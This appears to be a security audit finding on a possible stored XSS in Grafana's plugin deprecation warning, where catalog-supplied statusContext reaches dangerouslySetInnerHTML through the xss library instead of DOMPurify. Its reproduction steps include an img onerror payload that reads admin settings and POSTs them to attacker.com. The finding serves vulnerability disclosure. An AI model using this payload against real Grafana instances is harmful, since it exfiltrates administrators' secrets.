Phase: 10
Sequence: 018
Slug: plugin-deprecated-warning-xss-no-dompurify
Verdict: VALID
Rationale: PluginDetailsDeprecatedWarning renders plugin.details.statusContext via renderMarkdown (xss-library sanitizer, not DOMPurify) without an explicit sanitization call before passing to dangerouslySetInnerHTML; statusContext originates from the grafana.com plugin catalog API and is attacker-controlled via a malicious plugin author, sharing the same supply-chain XSS trust boundary as p8-044.
Severity-Original: MEDIUM
PoC-Status: theoretical
Origin-Finding: security/findings-draft/p8-044-plugin-readme-xss-no-sanitization.md
Origin-Pattern: AP-044

## Summary

`PluginDetailsDeprecatedWarning.tsx:42` renders `plugin.details.statusContext` using `renderMarkdown()` and passes the result to `dangerouslySetInnerHTML`. The `statusContext` field originates from the grafana.com plugin catalog API response. The `renderMarkdown` function uses `sanitizeTextPanelContent` (backed by the `xss` npm library), which is a different and potentially less strict sanitizer than DOMPurify. Critically, the `xss` library's whitelist may allow event handler attributes or SVG-based XSS vectors that DOMPurify blocks. A malicious plugin author whose plugin is marked deprecated in the catalog can embed XSS payloads in the `statusContext` field, which appears in the deprecation warning banner displayed when any admin views the plugin details page.

## Location

- **Primary**: `public/app/features/plugins/admin/components/PluginDetailsDeprecatedWarning.tsx:42-44`
  ```tsx
  dangerouslySetInnerHTML={{
    __html: renderMarkdown(plugin.details.statusContext),
  }}
  ```
- **Data source**: `plugin.details.statusContext` from grafana.com plugin catalog API
- **Sanitizer used**: `renderMarkdown` -> `sanitizeTextPanelContent` -> xss library (not DOMPurify)
- **Trigger**: Admin views `/plugins/:pluginId` when the plugin is marked deprecated in the catalog

## Attacker Control

- **Input**: `plugin.details.statusContext` field in the plugin catalog API response (controlled by plugin author or catalog data)
- **Vector**: Supply chain -- malicious deprecated plugin in grafana.com catalog
- **Trigger**: Any admin navigating to the plugin details page for a deprecated plugin

## Trust Boundary Crossed

External plugin catalog (grafana.com) -> Admin browser session. Same trust boundary as p8-044.

## Impact

- **Session hijacking**: XSS executes in admin browser with full admin privileges
- **Same impact as p8-044**: Admin account creation, datasource secret exfiltration, org takeover
- **Additional note**: The deprecation warning targets plugins already in the catalog with a `deprecated` status, which may receive less security scrutiny during catalog review

## Evidence

1. `PluginDetailsDeprecatedWarning.tsx:43`: `__html: renderMarkdown(plugin.details.statusContext)` -- no DOMPurify wrapping
2. `packages/grafana-data/src/text/markdown.ts:44-45`: `renderMarkdown` calls `sanitizeTextPanelContent(html)` which uses the xss library, not DOMPurify
3. Contrast with `public/app/features/explore/TraceView/.../KeyValuesTable.tsx:140` which explicitly calls `DOMPurify.sanitize(html)` before `dangerouslySetInnerHTML`
4. The xss library whitelist is more permissive than DOMPurify for some SVG and style-based vectors

## Reproduction Steps

1. Publish a plugin to grafana.com catalog (or use a local plugin with catalog override) with `deprecated` status and a `statusContext` containing XSS payload
2. The statusContext field is markdown that renders to:
   ```html
   <img src=x onerror="fetch('/api/admin/settings').then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:JSON.stringify(d)}))">
   ```
3. Install the deprecated plugin in Grafana
4. As an admin, navigate to `/plugins/:pluginId` -- the deprecation warning alert is displayed
5. The XSS payload in `statusContext` executes in admin browser session
